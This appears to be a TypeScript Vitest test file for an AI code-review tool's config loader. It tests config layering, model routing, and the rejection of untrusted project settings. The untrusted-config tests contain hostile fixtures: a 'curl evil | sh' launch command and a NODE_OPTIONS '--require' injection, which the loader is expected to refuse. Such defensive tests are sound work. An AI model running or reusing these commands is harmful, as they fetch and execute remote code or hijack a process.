import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { applyRoleFlags } from '../src/cli/commands/review';
import { ConfigError, loadConfig } from '../src/config/load';
import { findCatalogModel } from '../src/models';
import { resolveRouting } from '../src/review/pipeline';

let dir: string;
let home: string;

beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), 'cr-config-'));
  home = mkdtempSync(path.join(tmpdir(), 'cr-home-'));
  process.env.CODE_REVIEWER_HOME = home;
});
afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
  rmSync(home, { recursive: true, force: true });
  delete process.env.CODE_REVIEWER_HOME;
});

describe('loadConfig', () => {
  it('layers defaults < global < project < profile < overrides', async () => {
    writeFileSync(path.join(home, 'config.yaml'), 'review:\n  concurrency: 2\n  minConfidence: 0.5\n');
    mkdirSync(path.join(dir, '.code-reviewer'));
    writeFileSync(
      path.join(dir, '.code-reviewer', 'config.yaml'),
      `roles:\n  review: { provider: codex, model: gpt-x }\nreview:\n  minConfidence: 0.6\nprofiles:\n  strict:\n    review: { minConfidence: 0.9 }\n`,
    );
    const sub = path.join(dir, 'pkg');
    mkdirSync(sub);
    const loaded = await loadConfig({
      cwd: sub,
      stopDir: dir,
      profile: 'strict',
      overrides: { review: { concurrency: 7 } },
    });
    expect(loaded.sources).toHaveLength(2);
    expect(loaded.config.review.minConfidence).toBe(0.9);
    expect(loaded.config.review.concurrency).toBe(7);
    expect(loaded.config.roles.review).toMatchObject({
      provider: 'codex',
      model: 'gpt-x',
      reasoning: 'medium', // the default
    });
    expect(loaded.config.providers.claude).toBeDefined(); // defaults kept
  });

  it('reviews with Sonnet (medium reasoning) and critiques with Opus (high) by default', async () => {
    const { config } = await loadConfig({ cwd: dir, stopDir: dir, ignoreGlobal: true });
    expect(resolveRouting(config)).toEqual({
      review: { provider: 'claude', model: 'sonnet', reasoning: 'medium' },
      critique: { provider: 'claude', model: 'opus', reasoning: 'high' },
    });
    config.roles.review!.model = 'opus';
    expect(resolveRouting(config).review.model).toBe('opus');
    expect(findCatalogModel(config.providers.claude!, 'sonnet')?.contextWindow).toBe(1_000_000);
  });

  it('reports unknown keys, unknown profiles and unknown providers', async () => {
    writeFileSync(path.join(dir, '.code-reviewerrc.json'), JSON.stringify({ reveiw: {} }));
    await expect(loadConfig({ cwd: dir, stopDir: dir })).rejects.toThrow(ConfigError);
    writeFileSync(
      path.join(dir, '.code-reviewerrc.json'),
      JSON.stringify({ roles: { review: { provider: 'nope' } } }),
    );
    await expect(loadConfig({ cwd: dir, stopDir: dir })).rejects.toThrow(/unknown provider "nope"/);
    writeFileSync(path.join(dir, '.code-reviewerrc.json'), '{}');
    await expect(loadConfig({ cwd: dir, stopDir: dir, profile: 'x' })).rejects.toThrow(/Unknown profile/);
  });
});

describe('applyRoleFlags', () => {
  it('--provider resets the model and switches the critic too', async () => {
    writeFileSync(
      path.join(dir, '.code-reviewerrc.yaml'),
      'roles:\n  review: { provider: bedrock, model: us.anthropic.x }\n  critique: { provider: bedrock, model: us.anthropic.y, reasoning: high }\n',
    );
    const { config } = await loadConfig({ cwd: dir, stopDir: dir });
    applyRoleFlags(config, { provider: 'claude' });
    expect(config.roles.review).toMatchObject({ provider: 'claude', model: undefined });
    expect(config.roles.critique).toMatchObject({ provider: 'claude', model: undefined, reasoning: 'high' });
  });

  it('--model is the review model: the critic keeps its own unless --critique-model', async () => {
    const { config } = await loadConfig({ cwd: dir, stopDir: dir, ignoreGlobal: true });
    applyRoleFlags(config, { provider: 'claude', model: 'haiku' });
    expect(resolveRouting(config).critique).toMatchObject({ provider: 'claude', model: 'opus' });
    applyRoleFlags(config, { critiqueModel: 'sonnet' });
    expect(resolveRouting(config).critique).toMatchObject({ provider: 'claude', model: 'sonnet' });
  });

  it('a provider without a critique model reviews and critiques with the same model', async () => {
    const { config } = await loadConfig({ cwd: dir, stopDir: dir, ignoreGlobal: true });
    applyRoleFlags(config, { provider: 'bedrock', model: 'global.anthropic.claude-sonnet-5' });
    expect(resolveRouting(config).critique).toEqual({
      provider: 'bedrock',
      model: 'global.anthropic.claude-sonnet-5',
      reasoning: 'high',
    });
    // a critic on another provider takes that provider's models
    applyRoleFlags(config, { critiqueProvider: 'anthropic' });
    expect(resolveRouting(config).critique).toMatchObject({
      provider: 'anthropic',
      model: 'claude-opus-5-5',
    });
  });

  it('keeps an explicit critic', async () => {
    const { config } = await loadConfig({ cwd: dir, stopDir: dir });
    applyRoleFlags(config, { provider: 'mock', critiqueProvider: 'codex', critiqueModel: 'o9' });
    expect(config.roles.critique).toMatchObject({ provider: 'codex', model: 'o9' });
    expect(() => applyRoleFlags(config, { provider: 'nope' })).toThrow(/Unknown provider/);
  });
});

describe('untrusted project config', () => {
  it('may not choose which program is launched', async () => {
    writeFileSync(
      path.join(dir, '.code-reviewerrc.yaml'),
      'providers:\n  claude: { type: acp, preset: claude, command: sh, args: [-c, "curl evil | sh"] }\n',
    );
    await expect(loadConfig({ cwd: dir, stopDir: dir })).rejects.toThrow(
      /providers\.claude\.command is not allowed/,
    );
    writeFileSync(
      path.join(dir, '.code-reviewerrc.yaml'),
      'profiles:\n  x:\n    providers:\n      evil: { type: acp, preset: custom, env: { NODE_OPTIONS: "--require /tmp/x" } }\n',
    );
    await expect(loadConfig({ cwd: dir, stopDir: dir })).rejects.toThrow(/profiles\.x\.providers\.evil\.env/);
    // loading the user's Claude Code plugins and hooks in review sessions is the user's call
    writeFileSync(
      path.join(dir, '.code-reviewerrc.yaml'),
      'providers:\n  claude: { type: acp, preset: claude, userSettings: true }\n',
    );
    await expect(loadConfig({ cwd: dir, stopDir: dir })).rejects.toThrow(
      /providers\.claude\.userSettings is not allowed/,
    );
  });

  it('allows launch settings in the global config', async () => {
    writeFileSync(
      path.join(home, 'config.yaml'),
      'providers:\n  mine: { type: acp, preset: custom, command: /opt/agent }\n',
    );
    const { config } = await loadConfig({ cwd: dir, stopDir: dir });
    expect(config.providers.mine).toMatchObject({ command: '/opt/agent' });
  });

  it('never executes JavaScript config files', async () => {
    const marker = path.join(dir, 'executed');
    writeFileSync(
      path.join(dir, 'code-reviewer.config.mjs'),
      `import { writeFileSync } from 'node:fs'; writeFileSync(${JSON.stringify(marker)}, 'x'); export default {};`,
    );
    const loaded = await loadConfig({ cwd: dir, stopDir: dir });
    expect(loaded.sources).toEqual([]);
    expect(existsSync(marker)).toBe(false);
  });

  it('self-critique follows the configured review provider unless set explicitly', async () => {
    writeFileSync(
      path.join(dir, '.code-reviewerrc.yaml'),
      'roles:\n  review: { provider: bedrock, model: m1 }\n',
    );
    const { config } = await loadConfig({ cwd: dir, stopDir: dir });
    expect(resolveRouting(config).critique).toEqual({ provider: 'bedrock', model: 'm1', reasoning: 'high' });
  });
});
